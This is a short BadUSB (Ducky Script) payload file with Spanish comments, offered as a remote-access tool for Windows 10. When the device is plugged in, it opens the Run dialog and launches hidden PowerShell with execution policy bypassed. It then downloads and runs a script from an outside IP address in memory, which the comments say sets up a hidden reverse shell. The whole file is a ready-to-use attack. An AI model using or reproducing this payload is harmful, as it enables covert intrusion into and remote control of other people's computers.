# BadUSB

```bash 
REM Description: Abrir powershell y crea una reverse shell oculta
REM Target: Windows 10 (CMD, Powershell)
REM Version: 1.0
REM Category: Acceso Remoto
REM --> Utilizando IEX para realizar un GET por medio de la memoria comunicarse con nuestra ReverseShell.ps1

DELAY 300
GUI r
DELAY 20
STRING powershell -w h -NoP -NonI -Ep Bypass IEX (New-Object Net.WebClient).DownloadString('http://192.168.11.11/Invoke-Spartan.txt');
ENTER
```